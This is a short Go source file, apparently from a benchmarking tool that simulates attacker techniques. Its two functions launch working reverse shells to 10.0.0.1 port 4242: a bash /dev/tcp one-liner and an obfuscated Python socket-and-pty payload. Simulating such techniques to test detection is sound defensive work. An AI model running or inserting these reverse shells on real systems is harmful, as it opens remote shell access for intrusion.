package simulate

import (
	"fmt"
	"os/exec"
	"time"

	"github.com/tstromberg/ttp-bench/pkg/iexec"
)

func BashReverseShell() error {
	return iexec.WithTimeout(30*time.Second, "bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1")
}

func PythonReverseShell() error {
	py, err := exec.LookPath("python3")
	if err != nil {
		py, err = exec.LookPath("python")
	}
	if err != nil {
		return fmt.Errorf("unable to find python3 or python")
	}
	return iexec.WithTimeout(30*time.Second, py, "-c", `a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("10.0.0.1",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")`)
}
